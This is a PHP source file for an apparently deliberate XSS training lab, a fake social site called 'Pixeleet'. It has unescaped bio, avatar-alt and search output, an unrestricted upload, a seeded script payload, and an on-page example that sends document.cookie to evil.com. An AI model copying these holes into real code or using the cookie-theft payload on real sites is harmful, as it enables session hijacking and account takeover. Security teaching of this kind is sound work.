<?php
// Lab 1601 — Stored XSS via Profile Bio & Reflected XSS via Search Bar
// A social media platform demonstrating two XSS attack vectors:
//   1. Stored XSS — unsanitized profile bio executes when viewing user profiles
//   2. Reflected XSS — search bar echoes user input without sanitization
// Students learn how XSS can lead to account takeover via cookie theft.

session_start();

// ── Database ──────────────────────────────────────────────────────────────────
$db = new mysqli('localhost', 'root', '', 'VexiumCTF_DB');
if ($db->connect_error) { die('Database connection failed.'); }

// ── Table ─────────────────────────────────────────────────────────────────────
$db->query("CREATE TABLE IF NOT EXISTS lab1601_users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    email VARCHAR(100) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    bio TEXT DEFAULT '',
    avatar_path VARCHAR(255) DEFAULT '',
    avatar_alt TEXT DEFAULT '',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)") or die($db->error);

// Add avatar columns to existing installs (idempotent)
$db->query("ALTER TABLE lab1601_users ADD COLUMN IF NOT EXISTS avatar_path VARCHAR(255) DEFAULT ''");
$db->query("ALTER TABLE lab1601_users ADD COLUMN IF NOT EXISTS avatar_alt TEXT DEFAULT ''");

// ── Seed victim user (idempotent) ─────────────────────────────────────────────
$check = $db->query("SELECT COUNT(*) AS c FROM lab1601_users");
if ($check && $check->fetch_assoc()['c'] == 0) {
    $vPass = password_hash('sarah123', PASSWORD_BCRYPT);
    $st = $db->prepare("INSERT INTO lab1601_users (id, name, email, password, bio) VALUES (?, ?, ?, ?, ?)");
    $vId = 1; $vName = 'Sarah Johnson'; $vEmail = 'sarah@example.com';
    $vBio = 'Digital marketing strategist. <script>alert("XSS")</script>';
    $st->bind_param('issss', $vId, $vName, $vEmail, $vPass, $vBio);
    $st->execute();
    $st->close();

    $p1 = password_hash('hello123', PASSWORD_BCRYPT);
    $st = $db->prepare("INSERT INTO lab1601_users (name, email, password, bio) VALUES (?, ?, ?, ?)");
    $n1 = 'Alex Chen'; $e1 = 'alex@example.com'; $b1 = 'Full-stack developer | Coffee addict | Open-source contributor';
    $st->bind_param('ssss', $n1, $e1, $p1, $b1);
    $st->execute();
    $n2 = 'Maria Garcia'; $e2 = 'maria@example.com'; $b2 = 'UI/UX designer crafting beautiful digital experiences';
    $st->bind_param('ssss', $n2, $e2, $p1, $b2);
    $st->execute();
    $st->close();
}

// ── Helper ────────────────────────────────────────────────────────────────────
function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

// ── Routing ───────────────────────────────────────────────────────────────────
$action = $_GET['action'] ?? '';
$isLogout = isset($_GET['logout']);
$isRegister = ($action === 'register');
$isUpload = ($action === 'upload');
$searchQuery = isset($_GET['search']) ? $_GET['search'] : '';
$error = '';
$success = '';

// ── Handle Logout ─────────────────────────────────────────────────────────────
if ($isLogout) {
    session_destroy();
    header('Location: index.php');
    exit;
}

// ── Handle Registration ───────────────────────────────────────────────────────
if ($isRegister && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = trim($_POST['name'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $pass = $_POST['password'] ?? '';
    $confirm = $_POST['confirm_password'] ?? '';
    $bio = trim($_POST['bio'] ?? '');

    if (!$name || !$email || !$pass) {
        $error = 'Name, email and password are required.';
    } elseif ($pass !== $confirm) {
        $error = 'Passwords do not match.';
    } elseif (strlen($pass) < 6) {
        $error = 'Password must be at least 6 characters.';
    } else {
        $hash = password_hash($pass, PASSWORD_BCRYPT);
        $st = $db->prepare("INSERT INTO lab1601_users (name, email, password, bio) VALUES (?, ?, ?, ?)");
        $st->bind_param('ssss', $name, $email, $hash, $bio);
        if ($st->execute()) {
            $uid = $st->insert_id;
            $st->close();
            $_SESSION['lab1601_uid'] = $uid;
            $_SESSION['lab1601_name'] = $name;
            header('Location: index.php');
            exit;
        } else {
            $error = 'Email already registered. Please log in.';
        }
        $st->close();
    }
}

// ── Handle File Upload ────────────────────────────────────────────────────────
if ($isUpload && $_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_SESSION['lab1601_uid'])) {
    $uid = (int)$_SESSION['lab1601_uid'];
    if (!isset($_FILES['avatar']) || $_FILES['avatar']['error'] !== UPLOAD_ERR_OK) {
        $error = 'No file uploaded or upload error.';
    } else {
        $file = $_FILES['avatar'];
        $origName = basename($file['name']);
        if ($file['size'] > 5 * 1024 * 1024) {
            $error = 'File too large (max 5MB).';
        } else {
            $dir = 'uploads/';
            if (!is_dir($dir)) { mkdir($dir, 0777, true); }
            $dest = $dir . $origName;
            if (move_uploaded_file($file['tmp_name'], $dest)) {
                // ⚠️ VULNERABILITY: file content read verbatim and stored as the image alt attribute
                // e.g. xss.php contains: '"/><script>confirm(1);</script>
                // Rendered as:  <img src="..." alt="'"/><script>confirm(1);</script>">
                // The " closes alt=" , /> closes <img>, then <script> executes.
                $fileContent = file_get_contents($dest);
                $st = $db->prepare("UPDATE lab1601_users SET avatar_path = ?, avatar_alt = ? WHERE id = ?");
                $st->bind_param('ssi', $dest, $fileContent, $uid);
                $st->execute();
                $st->close();
                $success = 'Profile picture updated.';
            } else {
                $error = 'Upload failed. Check directory permissions.';
            }
        }
    }
}

// ── Handle Login ──────────────────────────────────────────────────────────────
if (!$isRegister && !$isUpload && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $pass = $_POST['password'] ?? '';
    $st = $db->prepare("SELECT * FROM lab1601_users WHERE email = ?");
    $st->bind_param('s', $email);
    $st->execute();
    $res = $st->get_result();
    $user = $res->fetch_assoc();
    $st->close();

    if ($user && password_verify($pass, $user['password'])) {
        $_SESSION['lab1601_uid'] = (int)$user['id'];
        $_SESSION['lab1601_name'] = $user['name'];
        header('Location: index.php');
        exit;
    } else {
        $error = 'Invalid email or password.';
    }
}

// ── Get current logged-in user ───────────────────────────────────────────────
$currentUser = null;
if (!empty($_SESSION['lab1601_uid'])) {
    $uid = (int)$_SESSION['lab1601_uid'];
    $st = $db->prepare("SELECT * FROM lab1601_users WHERE id = ?");
    $st->bind_param('i', $uid);
    $st->execute();
    $res = $st->get_result();
    $currentUser = $res->fetch_assoc();
    $st->close();
}

// ── Get all users for directory ──────────────────────────────────────────────
$allUsers = $db->query("SELECT id, name, bio FROM lab1601_users ORDER BY id ASC");

// ── Get profile to view (if viewing another user) ────────────────────────────
$viewUser = null;
$viewId = (int)($_GET['id'] ?? 0);
if ($viewId > 0) {
    $st = $db->prepare("SELECT * FROM lab1601_users WHERE id = ?");
    $st->bind_param('i', $viewId);
    $st->execute();
    $res = $st->get_result();
    $viewUser = $res->fetch_assoc();
    $st->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pixeleet — Connect & Share</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Inter', sans-serif; background: #f0f2f5; color: #1a1a2e; min-height: 100vh; }
a { text-decoration: none; color: inherit; }

/* ── Header ──────────────────────────────────────────────────────────────── */
.header {
    background: #fff;
    border-bottom: 1px solid #e0e0e0;
    padding: 0 24px;
    height: 64px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
    box-shadow: 0 1px 4px rgba(0,0,0,0.04);
}
.header-brand {
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 20px;
    font-weight: 800;
    color: #6366f1;
}
.header-brand .logo-icon {
    background: linear-gradient(135deg, #6366f1, #8b5cf6);
    color: #fff;
    width: 36px;
    height: 36px;
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    font-weight: 700;
}

/* ── Search Bar ──────────────────────────────────────────────────────────── */
.search-bar {
    flex: 1;
    max-width: 480px;
    margin: 0 24px;
    position: relative;
}
.search-bar input {
    width: 100%;
    padding: 10px 16px 10px 40px;
    border: 1px solid #e0e0e0;
    border-radius: 24px;
    font-size: 14px;
    background: #f5f5f5;
    transition: all 0.2s;
    font-family: 'Inter', sans-serif;
}
.search-bar input:focus {
    outline: none;
    border-color: #6366f1;
    background: #fff;
    box-shadow: 0 0 0 3px rgba(99,102,241,0.1);
}
.search-bar .search-icon {
    position: absolute;
    left: 14px;
    top: 50%;
    transform: translateY(-50%);
    color: #94a3b8;
    font-size: 14px;
}

.header-right {
    display: flex;
    align-items: center;
    gap: 16px;
    font-size: 14px;
    font-weight: 500;
}
.header-right a {
    color: #64748b;
    transition: color 0.2s;
    display: flex;
    align-items: center;
    gap: 6px;
}
.header-right a:hover { color: #6366f1; }
.header-right .user-name {
    color: #1a1a2e;
    font-weight: 600;
}
.header-right .btn-auth {
    background: #6366f1;
    color: #fff !important;
    padding: 8px 18px;
    border-radius: 20px;
    font-weight: 600;
    font-size: 13px;
}
.header-right .btn-auth:hover { background: #4f46e5; }

/* ── Container ───────────────────────────────────────────────────────────── */
.container {
    max-width: 720px;
    margin: 0 auto;
    padding: 32px 24px;
}

/* ── Card ────────────────────────────────────────────────────────────────── */
.card {
    background: #fff;
    border-radius: 16px;
    padding: 32px;
    margin-bottom: 24px;
    box-shadow: 0 1px 3px rgba(0,0,0,0.06);
    border: 1px solid #e8e8e8;
}
.card h2 {
    font-size: 20px;
    font-weight: 700;
    margin-bottom: 20px;
    display: flex;
    align-items: center;
    gap: 8px;
}

/* ── Messages ────────────────────────────────────────────────────────────── */
.msg {
    padding: 12px 16px;
    border-radius: 8px;
    font-size: 14px;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.msg-error { background: #fef2f2; border: 1px solid #fecaca; color: #dc2626; }
.msg-success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #16a34a; }

/* ── Forms ───────────────────────────────────────────────────────────────── */
.form-group { margin-bottom: 16px; }
.form-group label {
    display: block;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 6px;
    color: #374151;
}
.form-group label i { margin-right: 6px; color: #6366f1; }
.form-group input,
.form-group textarea {
    width: 100%;
    padding: 10px 14px;
    border: 1px solid #d1d5db;
    border-radius: 8px;
    font-size: 14px;
    font-family: 'Inter', sans-serif;
    transition: border-color 0.2s;
}
.form-group input:focus,
.form-group textarea:focus {
    outline: none;
    border-color: #6366f1;
    box-shadow: 0 0 0 3px rgba(99,102,241,0.1);
}
.form-group textarea { resize: vertical; min-height: 80px; }

.btn {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    padding: 10px 24px;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
    font-family: 'Inter', sans-serif;
}
.btn-primary {
    background: #6366f1;
    color: #fff;
}
.btn-primary:hover { background: #4f46e5; transform: translateY(-1px); }
.btn-sm { padding: 8px 16px; font-size: 13px; }

.auth-toggle {
    text-align: center;
    margin-top: 20px;
    font-size: 14px;
    color: #64748b;
}
.auth-toggle a { color: #6366f1; font-weight: 600; }
.auth-toggle a:hover { text-decoration: underline; }

/* ── Profile ─────────────────────────────────────────────────────────────── */
.profile-header {
    display: flex;
    align-items: flex-start;
    gap: 24px;
    margin-bottom: 24px;
}
.avatar-circle {
    width: 80px;
    height: 80px;
    border-radius: 50%;
    background: linear-gradient(135deg, #6366f1, #8b5cf6);
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    font-size: 28px;
    font-weight: 700;
    flex-shrink: 0;
}
.avatar-img {
    width: 80px;
    height: 80px;
    border-radius: 50%;
    object-fit: cover;
    flex-shrink: 0;
    border: 3px solid #e8e8ff;
}
.profile-info h1 {
    font-size: 22px;
    font-weight: 700;
    margin-bottom: 4px;
}
.profile-info .email {
    font-size: 14px;
    color: #64748b;
}
.profile-bio {
    margin-top: 16px;
    padding: 16px;
    background: #f8f9ff;
    border-radius: 10px;
    border: 1px solid #e8e8ff;
    line-height: 1.6;
    font-size: 14px;
}

/* ── User Directory ──────────────────────────────────────────────────────── */
.user-card {
    display: flex;
    align-items: center;
    gap: 16px;
    padding: 16px;
    border-radius: 12px;
    transition: background 0.2s;
    cursor: pointer;
    border: 1px solid transparent;
}
.user-card:hover { background: #f8f9ff; border-color: #e8e8ff; }
.user-card .avatar-small {
    width: 48px;
    height: 48px;
    border-radius: 50%;
    background: linear-gradient(135deg, #6366f1, #8b5cf6);
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    font-size: 18px;
    font-weight: 700;
    flex-shrink: 0;
}
.user-card .user-name { font-weight: 600; font-size: 15px; }
.user-card .user-bio {
    font-size: 13px;
    color: #64748b;
    margin-top: 2px;
}

/* ── Search Results ──────────────────────────────────────────────────────── */
.search-header {
    margin-bottom: 24px;
}
.search-header h2 {
    font-size: 18px;
    font-weight: 600;
    color: #374151;
}
.search-header .search-term {
    color: #6366f1;
    font-weight: 700;
}
.search-header .cookie-note {
    margin-top: 16px;
    padding: 16px 20px;
    background: #fefce8;
    border: 1px solid #fde68a;
    border-radius: 10px;
    font-size: 14px;
    color: #92400e;
    line-height: 1.6;
}
.search-header .cookie-note strong { color: #b45309; }
.search-header .cookie-note code {
    background: #fef9c3;
    padding: 2px 6px;
    border-radius: 4px;
    font-size: 12px;
}

/* ── Landing Hero ────────────────────────────────────────────────────────── */
.hero {
    text-align: center;
    padding: 60px 24px 40px;
}
.hero h1 {
    font-size: 36px;
    font-weight: 800;
    background: linear-gradient(135deg, #6366f1, #8b5cf6);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    margin-bottom: 12px;
}
.hero p {
    font-size: 16px;
    color: #64748b;
    margin-bottom: 32px;
}

/* ── Responsive ──────────────────────────────────────────────────────────── */
@media (max-width: 640px) {
    .header { padding: 0 12px; gap: 8px; }
    .search-bar { margin: 0 8px; }
    .header-right .btn-auth { padding: 6px 12px; font-size: 12px; }
    .container { padding: 16px 12px; }
    .card { padding: 20px 16px; }
    .profile-header { flex-direction: column; align-items: center; text-align: center; }
    .hero h1 { font-size: 26px; }
}
</style>
</head>
<body>

<!-- ═══════════════════════════════════════════════════════════════════════ -->
<!-- HEADER -->
<!-- ═══════════════════════════════════════════════════════════════════════ -->
<div class="header">
    <a href="index.php" class="header-brand">
        <div class="logo-icon">P</div>
        <span>Pixeleet</span>
    </a>

    <!-- Search Bar — visible on all pages -->
    <form class="search-bar" method="GET" action="index.php">
        <i class="fas fa-search search-icon"></i>
        <input type="text" name="search" placeholder="Search Pixeleet..." value="<?= isset($_GET['search']) ? $_GET['search'] : '' ?>">
    </form>

    <div class="header-right">
        <?php if ($currentUser): ?>
            <span class="user-name"><i class="fas fa-user"></i> <?= esc($currentUser['name']) ?></span>
            <a href="index.php"><i class="fas fa-home"></i> Home</a>
            <a href="index.php?logout=1"><i class="fas fa-sign-out-alt"></i> Logout</a>
        <?php else: ?>
            <a href="index.php"><i class="fas fa-sign-in-alt"></i> Sign In</a>
            <a href="index.php?action=register" class="btn-auth"><i class="fas fa-user-plus"></i> Join</a>
        <?php endif; ?>
    </div>
</div>

<div class="container">

<?php
// ── SEARCH RESULTS (Reflected XSS) ─────────────────────────────────────
// ⚠️ VULNERABILITY: The search query is echoed back WITHOUT htmlspecialchars!
// This allows reflected XSS via <script> injection in the search parameter.
?>
<?php if ($searchQuery !== ''): ?>
    <div class="card search-header">
        <h2>Search results for "<span class="search-term"><?= $searchQuery ?></span>"</h2>
        <p style="color:#64748b;font-size:14px;margin-top:8px;">No users found matching your query.</p>

        <!-- Educational note about cookie theft via XSS -->
        <div class="cookie-note">
            <strong><i class="fas fa-shield-alt"></i> Understanding XSS & Account Takeover:</strong><br>
            An attacker can craft a malicious search URL containing JavaScript that steals the victim's session cookie.
            For example: <code>?search=&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code><br><br>
            When a logged-in victim visits this crafted URL, their session cookie is sent to the attacker's server.
            The attacker can then impersonate the victim and gain full access to their account — <strong>account takeover</strong>.
            Always sanitize user input before rendering it in the browser!
        </div>
    </div>
<?php endif; ?>

<?php if (!$currentUser && $searchQuery === ''): ?>
    <!-- ═══════════════════════════════════════════════════════════════════ -->
    <!-- LANDING / LOGIN PAGE -->
    <!-- ═══════════════════════════════════════════════════════════════════ -->
    <?php if (!$isRegister): ?>
        <div class="hero">
            <h1>Welcome to Pixeleet</h1>
            <p>Connect with creative minds around the world. Share your story, find your community.</p>
        </div>
        <div class="card" style="max-width:420px;margin:0 auto;">
            <h2><i class="fas fa-sign-in-alt"></i> Sign In</h2>
            <?php if ($error): ?>
                <div class="msg msg-error"><i class="fas fa-exclamation-circle"></i> <?= esc($error) ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="form-group">
                    <label><i class="fas fa-envelope"></i> Email</label>
                    <input type="email" name="email" placeholder="you@example.com" required>
                </div>
                <div class="form-group">
                    <label><i class="fas fa-lock"></i> Password</label>
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;">
                    <i class="fas fa-arrow-right"></i> Sign In
                </button>
            </form>
            <div class="auth-toggle">
                Don't have an account? <a href="index.php?action=register">Join Pixeleet</a>
            </div>
        </div>

    <!-- ═══════════════════════════════════════════════════════════════════ -->
    <!-- REGISTER PAGE -->
    <!-- ═══════════════════════════════════════════════════════════════════ -->
    <?php else: ?>
        <div class="hero" style="padding:30px 24px 20px;">
            <h1>Join Pixeleet</h1>
            <p>Create your profile and connect with the community.</p>
        </div>
        <div class="card" style="max-width:480px;margin:0 auto;">
            <h2><i class="fas fa-user-plus"></i> Create Account</h2>
            <?php if ($error): ?>
                <div class="msg msg-error"><i class="fas fa-exclamation-circle"></i> <?= esc($error) ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="form-group">
                    <label><i class="fas fa-user"></i> Full Name</label>
                    <input type="text" name="name" placeholder="e.g., Jane Doe" required>
                </div>
                <div class="form-group">
                    <label><i class="fas fa-envelope"></i> Email</label>
                    <input type="email" name="email" placeholder="you@example.com" required>
                </div>
                <div class="form-group">
                    <label><i class="fas fa-lock"></i> Password</label>
                    <input type="password" name="password" placeholder="Min. 6 characters" required>
                </div>
                <div class="form-group">
                    <label><i class="fas fa-check-circle"></i> Confirm Password</label>
                    <input type="password" name="confirm_password" placeholder="Repeat password" required>
                </div>
                <div class="form-group">
                    <label><i class="fas fa-edit"></i> Bio</label>
                    <textarea name="bio" placeholder="Tell the community about yourself..."></textarea>
                </div>
                <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;">
                    <i class="fas fa-user-plus"></i> Create Account
                </button>
            </form>
            <div class="auth-toggle">
                Already have an account? <a href="index.php">Sign in</a>
            </div>
        </div>
    <?php endif; ?>

<?php elseif ($searchQuery === ''): ?>
    <!-- ═══════════════════════════════════════════════════════════════════ -->
    <!-- LOGGED IN — HOME FEED & USER DIRECTORY -->
    <!-- ═══════════════════════════════════════════════════════════════════ -->

    <?php if ($viewUser): ?>
        <!-- ═══════════════════════════════════════════════════════════════ -->
        <!-- VIEW USER PROFILE (Stored XSS triggers here)                 -->
        <!-- ⚠️ VULNERABILITY: $viewUser['bio'] is rendered RAW below!    -->
        <!-- ═══════════════════════════════════════════════════════════════ -->
        <a href="index.php" style="font-size:14px;color:#6366f1;margin-bottom:16px;display:inline-block;">
            <i class="fas fa-arrow-left"></i> Back to Home
        </a>
        <div class="card">
            <div class="profile-header">
                <?php
                $initials = '';
                $words = explode(' ', $viewUser['name']);
                foreach ($words as $w) { $initials .= strtoupper($w[0] ?? ''); }
                $initials = substr($initials, 0, 2);
                ?>
                <?php if (!empty($viewUser['avatar_path']) && file_exists($viewUser['avatar_path'])): ?>
                    <img class="avatar-img"
                         src="<?= esc($viewUser['avatar_path']) ?>"
                         alt="<?= $viewUser['avatar_alt'] ?>">
                <?php else: ?>
                    <div class="avatar-circle"><?= esc($initials) ?></div>
                <?php endif; ?>
                <div class="profile-info">
                    <h1><?= esc($viewUser['name']) ?></h1>
                    <div class="email"><i class="fas fa-envelope"></i> <?= esc($viewUser['email']) ?></div>
                </div>
            </div>

            <?php if ($viewUser['bio']): ?>
                <div class="profile-bio">
                    <?= $viewUser['bio'] ?>
                </div>
            <?php endif; ?>
        </div>

    <?php else: ?>
        <!-- My Profile Summary -->
        <div class="card">
            <div class="profile-header">
                <?php
                $myInitials = '';
                $myWords = explode(' ', $currentUser['name']);
                foreach ($myWords as $w) { $myInitials .= strtoupper($w[0] ?? ''); }
                $myInitials = substr($myInitials, 0, 2);
                ?>
                <?php if (!empty($currentUser['avatar_path']) && file_exists($currentUser['avatar_path'])): ?>
                    <img class="avatar-img"
                         src="<?= esc($currentUser['avatar_path']) ?>"
                         alt="<?= $currentUser['avatar_alt'] ?>">
                <?php else: ?>
                    <div class="avatar-circle"><?= esc($myInitials) ?></div>
                <?php endif; ?>
                <div class="profile-info">
                    <h1><?= esc($currentUser['name']) ?></h1>
                    <div class="email"><i class="fas fa-envelope"></i> <?= esc($currentUser['email']) ?></div>
                </div>
            </div>

            <?php if ($currentUser['bio']): ?>
                <div class="profile-bio">
                    <?= $currentUser['bio'] ?>
                </div>
            <?php endif; ?>

            <?php if ($error): ?>
                <div class="msg msg-error" style="margin-top:16px;"><i class="fas fa-exclamation-circle"></i> <?= esc($error) ?></div>
            <?php endif; ?>
            <?php if ($success): ?>
                <div class="msg msg-success" style="margin-top:16px;"><i class="fas fa-check-circle"></i> <?= esc($success) ?></div>
            <?php endif; ?>

            <!-- Upload Profile Picture -->
            <div style="margin-top:20px;padding-top:20px;border-top:1px solid #eee;">
                <form method="POST" action="index.php?action=upload" enctype="multipart/form-data"
                      style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
                    <label style="font-weight:600;font-size:14px;color:#374151;white-space:nowrap;">
                        <i class="fas fa-camera" style="color:#6366f1;"></i> Profile Picture
                    </label>
                    <input type="file" name="avatar" required style="font-size:13px;flex:1;min-width:0;">
                    <button type="submit" class="btn btn-primary btn-sm">
                        <i class="fas fa-upload"></i> Upload
                    </button>
                </form>
                <div style="margin-top:6px;font-size:12px;color:#94a3b8;">JPG, PNG, GIF &mdash; max 5MB</div>
            </div>

            <div style="margin-top:16px;font-size:13px;color:#94a3b8;">
                <i class="fas fa-calendar"></i> Joined <?= date('F Y', strtotime($currentUser['created_at'])) ?>
            </div>
        </div>

        <!-- User Directory -->
        <div class="card">
            <h2><i class="fas fa-users"></i> People</h2>
            <?php if ($allUsers && $allUsers->num_rows > 0): ?>
                <?php while ($u = $allUsers->fetch_assoc()): ?>
                    <?php if ((int)$u['id'] === (int)$currentUser['id']) continue; ?>
                    <a href="index.php?action=view&id=<?= (int)$u['id'] ?>" class="user-card">
                        <?php
                        $uInitials = '';
                        $uWords = explode(' ', $u['name']);
                        foreach ($uWords as $w) { $uInitials .= strtoupper($w[0] ?? ''); }
                        $uInitials = substr($uInitials, 0, 2);
                        ?>
                        <div class="avatar-small"><?= esc($uInitials) ?></div>
                        <div>
                            <div class="user-name"><?= esc($u['name']) ?></div>
                            <?php if ($u['bio']): ?>
                                <div class="user-bio"><?= esc(substr($u['bio'], 0, 100)) ?><?= strlen($u['bio']) > 100 ? '...' : '' ?></div>
                            <?php endif; ?>
                        </div>
                    </a>
                <?php endwhile; ?>
            <?php else: ?>
                <p style="color:#94a3b8;font-size:14px;">No other users yet.</p>
            <?php endif; ?>
        </div>
    <?php endif; ?>

<?php endif; ?>
</div>

</body>
</html>
